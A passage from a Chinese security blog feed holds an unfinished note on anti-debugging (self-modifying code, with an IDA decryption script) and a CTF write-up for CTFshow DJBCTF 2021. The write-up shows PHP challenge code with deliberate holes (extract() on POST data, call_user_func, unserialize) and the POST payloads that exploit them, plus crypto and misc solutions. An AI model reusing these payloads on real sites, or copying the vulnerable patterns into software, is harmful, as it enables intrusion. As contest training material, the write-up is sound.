    <content type="html"><![CDATA[<p>​    </p><p>静态反调试技术只需要在程序运行之前进行一次破解即可解除全部限制，且不需要二次操作。而且静态反调试技术对于操作系统的依赖性非常大，相同的反调试技术在不同的操作系统表现可能不同。</p><p>（待补充）</p><p>参考：</p><p><a href="https://xz.aliyun.com/t/5685">https://xz.aliyun.com/t/5685</a></p><p><a href="https://xz.aliyun.com/t/5732/">https://xz.aliyun.com/t/5732/</a></p><p><a href="https://xz.aliyun.com/t/6133">https://xz.aliyun.com/t/6133</a></p><hr><h3 id="栈指针平衡"><a href="#栈指针平衡" class="headerlink" title="栈指针平衡"></a>栈指针平衡</h3><p>​    </p><h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h3><p>​    </p><h3 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h3><p>SMC（自修改代码，Self-Modifying Code），就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。</p><p><strong>还原方法</strong></p><ol><li>首先确定需要加密的代码部分；</li><li>通过vs查看反汇编（或者OD、IDA等）可以确定对应部分的反汇编代码；</li><li>将这段代码手工用16进制编辑器覆盖为加密后的数据；</li><li>程序执行时则运行事先写好的代码先进行解密再运行。</li></ol><p><strong>参考</strong></p><p><a href="https://blog.csdn.net/qq_41923479/article/details/80377708">https://blog.csdn.net/qq_41923479/article/details/80377708</a><br><a href="https://blog.csdn.net/palmer9/article/details/105034093">https://blog.csdn.net/palmer9/article/details/105034093</a></p><p><strong>脚本</strong></p><p>IDA - File - Script file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x00401216</span>;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">0x43E</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^Byte(<span class="number">0x00409080</span>+i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MOV混淆"><a href="#MOV混淆" class="headerlink" title="MOV混淆"></a>MOV混淆</h3><p>​    </p><h3 id="OLLVM混淆（LLVM）"><a href="#OLLVM混淆（LLVM）" class="headerlink" title="OLLVM混淆（LLVM）"></a>OLLVM混淆（LLVM）</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;静态反调试技术只需要在程序运行之前进行一次破解即可解除全部限制，且不需要二次操作。而且静态反调试技术对于操作系统的依赖性非常大，相同的反调试技术在不同的操作系统表现可能不同。&lt;/p&gt;
&lt;p&gt;（待补充）&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a hr</summary>
      
    
    
    
    <category term="reverse" scheme="https://lazzzaro.github.io/categories/reverse/"/>
    
    
    <category term="反调试" scheme="https://lazzzaro.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow 大吉大利杯DJBCTF</title>
    <link href="https://lazzzaro.github.io/2021/01/24/match-CTFshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AFDJBCTF/"/>
    <id>https://lazzzaro.github.io/2021/01/24/match-CTFshow-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AFDJBCTF/</id>
    <published>2021-01-24T13:28:29.000Z</published>
    <updated>2021-04-27T11:54:43.213Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>比赛：CTFshow 大吉大利杯<br>简称：大吉杯 DJB<br>平台：<a href="https://ctf.sho/">https://ctf.sho</a>w<br>开始：2021/1/23 9:00<br>结束：2021/1/24 22:00<br>规则：<br>1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：wp.ctf.show<br>2 公平竞技，独立比赛<br>3 服务器不要爆破，不要攻击服务器，不要扫描!!!<br>4 奖品：新春月饼一份，单项前三定制量子水杯一个<br>5 题目征集：<a href="https://shimo.im/docs/YP3tVqPJTxD6jhdt">https://shimo.im/docs/YP3tVqPJTxD6jhdt</a></p></blockquote><p>出题：<strong>4 crypto + 1 reverse</strong></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">qwq</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Access Denied!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">oao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        show_source(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\_|\.|%|\*|\~|\^|\&#x27;|\&quot;|\;|\(|\)|\]|g|e|l|i|\//is&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shaw_root</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/&#x27;</span>, <span class="variable">$shaw_root</span>)&amp;&amp; strlen(<span class="variable">$shaw_root</span>)===<span class="number">29</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Almost there.&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Input correct parameters&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ans</span>===<span class="variable">$SecretNumber</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;Congratulations!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    call_user_func(<span class="variable">$my_ans</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><code>extract($_POST)</code>以POST方式传入变量。（第一个<code>preg_match</code>内的特殊字符完全无过滤作用，过滤的是<code>$str</code>变量。）</p><p>第一层，传入<code>$shaw_root</code>（如果上面<code>preg_match</code>过滤正常，则不能使用<code>_</code>，利用PHP特性，当参数名中含<code>+</code>/<code>[</code>/<code>.</code>/空格这些字符时会被解析为<code>_</code>，传入<code>shaw[root=1</code>）；接着匹配<code>preg_match</code>内正则表达式，利用 <a href="https://regex101.com/">https://regex101.com/</a> 可试出匹配的字符串，这里使用<code>-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx</code>，得到hint：</p><p><code>&gt;Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)==166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)===5</code></p><p>第二层，完全无需理会hint内容，照样利用<code>extract($_POST)</code>以POST方式传入参数<code>ans=1</code>和<code>SecretNumber=1</code>，覆盖原始变量值，再给<code>call_user_func</code>传入<code>my_ans</code>变量执行自定义函数，结合给出的类静态方法，传<code>my_ans=qwq:oao</code>得flag。</p><p>payload: <code>shaw_root=-a9&lt;b&gt;xxxxxx&gt;&gt;&gt;&gt;zzabcdphp@Rsx&amp;ans=1&amp;SecretNumber=1&amp;my_ans=qwq::oao</code></p><p>​    </p><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">spaceman</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;ctfshowvip&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;ctfshowup&#x27;</span>,<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_|\.|\]|\[/is&#x27;</span>,<span class="variable">$str</span>))&#123;            </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;I am sorry but you have to leave.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_POST</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = filter(serialize(<span class="keyword">new</span> spaceman(<span class="variable">$user_name</span>,<span class="variable">$pass_word</span>)));</span><br><span class="line"><span class="variable">$test</span> = unserialize(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></blockquote><p>应该是出题失误，本想考反序列化字符逃逸，结果变成很简单的非预期。</p><p>同样，<code>extract($_POST)</code>以POST方式传入变量。（第一个<code>preg_match</code>内的特殊字符完全无过滤作用，过滤的是<code>$str</code>变量。）</p><p>传入<code>user_name=1&amp;pass_word=ctfshowvip</code>即得flag。</p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="十八般兵器"><a href="#十八般兵器" class="headerlink" title="十八般兵器"></a>十八般兵器</h3><blockquote><p>刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙</p><p>hint1: JPHS</p><p>hint2: 用Notepad++打开试试？</p><p>hint3: 前十种兵器对应10进制，后八种对应8进制</p></blockquote><p>18张图，根据hint1，用jphs05隐写工具分别从18张图分别提取出txt文件（空密码），</p><p>再根据hint2分别把每个txt文件最后一行的数字都摘出，前十个连接后十进制转字符串，后八个连接后八进制转字符串，字符串连接起来为flag。</p><p>​    </p><h3 id="请问大吉杯的签到是在这里签吗"><a href="#请问大吉杯的签到是在这里签吗" class="headerlink" title="请问大吉杯的签到是在这里签吗"></a>请问大吉杯的签到是在这里签吗</h3><blockquote><p>flag为全部小写字母，没有空格</p></blockquote><p>一张二维码，按照扫码内容能分离出提取出4张二维码，内容有提示意义，</p><p>第2张图的内容为<code>还要往前走......是不是在这个路口转弯呢？</code>，有问题，上stegsolve查看，在Random colour map就能看出端倪：</p><p><img src="/match-CTFshow-大吉大利杯DJBCTF/solved.png" alt="solved"></p><p>猪圈密码对照解密得flag。</p><p>​    </p><h3 id="牛年大吉"><a href="#牛年大吉" class="headerlink" title="牛年大吉"></a>牛年大吉</h3><blockquote><p>题目下载 蓝奏云下载地址：<a href="https://wws.lanzous.com/i1Ac0jybrvc">https://wws.lanzous.com/i1Ac0jybrvc</a> </p><p>百度云下载地址： <a href="https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ">https://pan.baidu.com/s/14EXw7U4w0Am0oP_xRXfbqQ</a> 提取码：ns2k</p><p>hint1: 不要格式化哟，看看引导扇区是不是丢东西了</p><p>hint2: 压缩包密码在图片文件头里</p></blockquote><p>vhd磁盘文件，用DiskGenius装载，修复磁盘，能提取出<code>!lag.7z</code>和<code>牛年大吉.png</code>两个文件，根据hint2，7z压缩包密码为png文件头<code>89504E47</code>，解压得flag。</p><p>​    </p><h3 id="拼图v2-0"><a href="#拼图v2-0" class="headerlink" title="拼图v2.0"></a>拼图v2.0</h3><blockquote><p>有手就行，没手的可以拿眼睛去瞪</p></blockquote><p>打开环境，带旋转的拼图，gaps不方便，纯手工上。</p><p><img src="/match-CTFshow-大吉大利杯DJBCTF/拼图2.png" alt="拼图2" style="zoom:80%;" /></p><p>​    </p><h3 id="AA86"><a href="#AA86" class="headerlink" title="AA86"></a>AA86</h3><blockquote><p>在一台旧电脑上（大约在16位操作系统还能跑的年代）发现了这个文件，挖掘它的秘密</p><p>hint: 请仔细阅读题目描述(5毛一条，去掉括号)</p></blockquote><p>根据提示关键是16位操作系统。</p><p>Google搜索<code>DOS AA86</code>，在第2条结果可发现AA86文件编码说明：</p><blockquote><p>Aa86 is a .COM file encoder by Yosuke Hasegawa that encodes binaries using only symbols characters, with a decoder.</p></blockquote><p>把文件加上后缀<code>.COM</code>，找个MSDOS在虚拟机安装，再运行<code>AA86.COM</code>得flag。</p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="easysignin"><a href="#easysignin" class="headerlink" title="easysignin"></a>easysignin</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genpq</span>(<span class="params">k</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime((k + <span class="number">3</span>) // <span class="number">4</span>)</span><br><span class="line">        q = getPrime((k + <span class="number">3</span>) // <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ((p ** <span class="number">2</span>) * (q ** <span class="number">2</span>)).bit_length() == k:</span><br><span class="line">            <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genseq</span>(<span class="params">t, k</span>):</span></span><br><span class="line">x = getrandbits(k)</span><br><span class="line">y = getrandbits(k)</span><br><span class="line">r = []</span><br><span class="line">r += [<span class="built_in">pow</span>(x * getrandbits(k)+y, <span class="built_in">pow</span>(getrandbits(k), t - <span class="number">1</span>, t), t)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">r += [<span class="built_in">pow</span>(x * r[i] +y, <span class="built_in">pow</span>(getrandbits(k), t - <span class="number">1</span>, t), t)]</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">(p, q) = genpq(<span class="number">2021</span>)</span><br><span class="line">e = getPrime(<span class="number">0x0123</span>)</span><br><span class="line">r = [genseq(p, p.bit_length() // <span class="number">4</span>), genseq(q, q.bit_length() // <span class="number">4</span>), genseq(e, e.bit_length() // <span class="number">4</span>)]</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, <span class="number">2021</span> * p * q)</span><br><span class="line"></span><br><span class="line">out = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">out.write(<span class="built_in">str</span>(r) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">out.write(<span class="built_in">str</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">out.close()</span><br></pre></td></tr></table></figure></blockquote><p>套LCG壳的RSA。</p><p>首先解决<a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/#%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E7%94%9F%E6%88%90%E5%99%A8-%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E6%B3%95%EF%BC%88LCG%EF%BC%89">LCG问题</a>，</p><p>观察 <code>genseq()</code> 函数，发现 <code>pow(getrandbits(k), t - 1, t)</code> 为混淆式，由于传入的 $t$ 为质数，可根据<a href="https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/#%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86">费马小定理</a>化为1，再按照正常方式生成递归状态数组 $r_{i+1}=(x \cdot r_i+y) \pmod t$，其中乘数 $x$、增量$y$、模数$t$ 均未知。</p><p>三次调用<code>genseq()</code>函数，产生以 $p,q,e$ 为模数的递归状态数组 $r_p,r_q,r_e$，利用三种值未知情况下的<a href="https://zeroyu.xyz/2018/11/02/Cracking-LCG/">攻击方式</a>，求出 $p,q,e$ 值。</p><p>再解简单RSA即得flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span>(<span class="params">states</span>):</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">rp = []</span><br><span class="line">rq = []</span><br><span class="line">re = []</span><br><span class="line">xp, yp, p = crack_unknown_modulus(rp)</span><br><span class="line">xq, yq, q = crack_unknown_modulus(rq)</span><br><span class="line">xe, ye, e = crack_unknown_modulus(re)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#RSA步骤略</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="luckybase"><a href="#luckybase" class="headerlink" title="luckybase"></a>luckybase</h3><blockquote><p>baseの试炼</p><p>hint: b64decode(‘452/4520’)=’㝿㝴’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, random</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> getcwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(getcwd() + <span class="string">&#x27;/&#x27;</span> + __file__, <span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">luck = randint(<span class="number">0</span>, <span class="number">2021</span>) * random()</span><br><span class="line"><span class="built_in">print</span>(luck)</span><br><span class="line"></span><br><span class="line">good = <span class="built_in">eval</span>(b64encode(<span class="built_in">input</span>().encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(good - luck) &lt; <span class="number">1e-10</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Back luck 2021???&#x27;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>其实算半个misc题。</p><p>代码逻辑为，输入内容，使得UTF-8字符以base64编码后结果与给定的float值近似（$10^{-10}$误差内）。</p><p>base64编码的结果包含的字符有<code>ABCDEFGHIJKLMNOPQRSVWXYZabcdeghiklmnopqrstuvxyz0123456789+/</code>，那么可以使用数字<code>0123456789</code>和运算符号<code>+</code>或<code>/</code>凑出计算式来表示<code>0.1</code>，以及用<code>e+数字</code>凑出科学计数法。</p><p>由于任意浮点数都可以表示为 $\sum\limits_{i,j&lt;k}(d_i \cdot 0.1\cdot 10^{-j})$，其中 $d_i$ 表示第 $i$ 位的数字，$j$ 表示对应的指数值，如</p><p>$1.143=11 \cdot 0.1 \cdot 10^{0}+4 \cdot 0.1 \cdot 10^{-1}+3 \cdot 0.1 \cdot 10^{-2}$</p><p>根据hint，$0.1$可表示为<code>452/4520</code>，$10^{-j}$可以表示为<code>e+数字</code>，系数 $d_i$ 可以变为对应的项的叠加，以 $1.143$ 